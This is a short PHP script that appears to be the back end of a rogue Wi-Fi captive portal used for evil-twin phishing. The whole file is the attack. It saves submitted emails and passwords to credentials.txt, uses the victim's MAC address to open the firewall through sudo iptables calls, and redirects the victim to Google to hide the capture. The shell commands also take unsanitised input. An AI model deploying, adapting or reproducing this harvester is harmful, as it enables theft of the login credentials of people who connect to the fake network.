<?php

$pid = "$PID";
$type = $_POST['type'];
$email = $_POST['email'];
$password = $_POST['password'];

file_put_contents('credentials.txt', file_get_contents('php://input'), FILE_APPEND);
file_put_contents('credentials.txt', "\n", FILE_APPEND);

$ip = $_SERVER['REMOTE_ADDR'];
$mac = shell_exec('sudo -u www-data /usr/sbin/arp -an ' . $ip);
preg_match('/..:..:..:..:..:../', $mac, $matches);
$arp = @$matches[0];

if (!file_exists('credentials.txt')) {
    header('Location: ' . $_SERVER['HTTP_REFERER']);
}

shell_exec("sudo iptables -t nat -I PREROUTING -p tcp -m mac --mac-source ".$arp." -j ACCEPT");
shell_exec("sudo iptables -t mangle -I captiveportal 1 -m mac --mac-source ".$arp." -j RETURN 2>&1");
header("Location: https:\/\/www.google.com");

?>
